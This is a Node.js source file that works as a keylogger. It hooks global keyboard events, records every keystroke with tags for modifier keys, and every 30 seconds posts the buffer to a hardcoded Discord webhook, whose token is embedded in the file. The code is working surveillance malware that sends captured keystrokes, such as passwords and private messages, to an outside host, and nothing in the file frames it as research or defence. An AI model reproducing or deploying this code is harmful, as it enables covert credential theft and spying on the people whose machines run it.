//import {GlobalKeyboardListener} from "node-global-key-listener";

const { spawn } = require('child_process');
const GlobalKeyboardListener = require('node-global-key-listener').GlobalKeyboardListener
const axios = require('axios')

const v = new GlobalKeyboardListener();

var l_shift_dn = false
var l_alt_dn = false
var r_shift_dn = false
var r_alt_dn = false
var keylogs = '';

//Log every key that's pressed.
v.addListener(function (e, down) {
    // console.log(
    //     `${e.name} ${e.state == "DOWN" ? "DOWN" : "UP  "} [${e.rawKey._nameRaw}]`
    // )
    if (e.state == "UP") {
        switch (e.name) {
            case 'TAB':
                process.stdout.write('<TAB>');
                keylogs += '<TAB>'
                break;
            case 'RETURN':
                process.stdout.write('<ENTER>');
                keylogs += '<ENTER>'
                break;
            case 'SPACE':
                process.stdout.write(' ');
                keylogs += ' '
                break;
            case 'ESCAPE':
                process.stdout.write('<ESC>');
                keylogs += '<ESC>'
                break;
            case 'DELETE':
                process.stdout.write('<DEL>');
                keylogs += '<DEL>'
                break;
            case 'BACKSPACE':
                process.stdout.write('<B.SPACE>');
                keylogs += '<B.SPACE>'
                break;
            case 'LEFT SHIFT':
                process.stdout.write('</L.SHIFT>');
                keylogs += '</L.SHIFT>'
                l_shift_dn = false
                break;
            case 'LEFT ALT':
                process.stdout.write('</L.ALT>');
                keylogs += '</L.ALT>'
                l_alt_dn = false
                break;
            case 'RIGHT SHIFT':
                process.stdout.write('</R.SHIFT>');
                keylogs += '</R.SHIFT>'
                r_shift_dn = false
                break;
            case 'RIGHT ALT':
                process.stdout.write('</R.ALT>');
                keylogs += '</R.ALT>'
                r_alt_dn = false
                break;
            default: 
                process.stdout.write(e.name);
                keylogs += e.name
        }
    }
    if (e.state == "DOWN") {
        switch (e.name) {
            case 'LEFT SHIFT':
                if (l_shift_dn == false) {
                    l_shift_dn = true
                    process.stdout.write('<L.SHIFT>');
                    keylogs += '<L.SHIFT>'
                }
                break;
            case 'LEFT ALT':
                if(l_alt_dn == false){
                    l_alt_dn = true
                    process.stdout.write('<L.ALT>');
                    keylogs += '<L.ALT>'
                }
                break;
            case 'RIGHT SHIFT':
                if(r_shift_dn == false){
                    r_shift_dn = true
                    process.stdout.write('<R.SHIFT>');
                    keylogs += '<R.SHIFT>'
                }
                break;
            case 'RIGHT ALT':
                if(r_alt_dn == false){
                    r_alt_dn = true
                    process.stdout.write('<R.ALT>');
                    keylogs += '<R.ALT>'
                }
                break;
        }
    }
});


setInterval( async () => {
    await axios.post('https://discord.com/api/webhooks/1236251085543313429/Fdl-oL5KLob1CVlR1Mq3XLaTNZElbRQMUyfr72yad-UxdKF9kOXOE6Vs9pCzxP9-TwMj', {
        "content": keylogs
    }).then(async () => {
        keylogs = ''
    })
}, 1000 * 30)